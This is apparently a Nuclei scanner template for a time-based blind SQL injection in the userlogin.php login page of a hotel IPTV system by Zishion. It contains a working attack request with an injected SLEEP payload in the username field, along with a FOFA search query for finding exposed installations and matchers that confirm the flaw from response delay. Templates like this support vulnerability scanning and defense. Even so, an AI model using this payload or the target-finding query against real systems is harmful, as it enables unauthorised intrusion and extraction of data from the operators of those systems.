id: zishion-iptv-userlogin-sqli
info:
  name: 酒店智慧营销IPTV系统 userlogin.php - sqli
  author: leadlife
  severity: high
  description: 子辰视讯IPTV系统拥有电信级全业务功能，支持电视直播（IGMP组播模式和HLS单播模式同时）、4K超高清、时移回看、内网视频点播、外网OTT点播、桌面定制、应用推送、字幕广告、挂角广告、用户认证计费和到期提醒等。该系统 userlogin.php存在sql注入漏洞,攻击者可利用该漏洞获取系统信息。
  reference: 
    - https://github.com/wy876/POC/blob/main/IPTV%E7%B3%BB%E7%BB%9F/%E9%85%92%E5%BA%97%E6%99%BA%E6%85%A7%E8%90%A5%E9%94%80IPTV%E7%B3%BB%E7%BB%9Fuserlogin.php%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="xsiptvp"
  tags: zishion,sqli,iptv,time

http:
  - raw:  
      - |
        @timeout: 15s
        POST /xsiptva/cniptv/userlogin.php HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: keep-alive
        Content-Length: 113
        Content-Type: application/x-www-form-urlencoded
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36

        username=admin' AND (SELECT 6707 FROM (SELECT(SLEEP(5)))mQbf) AND '1'='1&password=admin

    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'IPTV')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and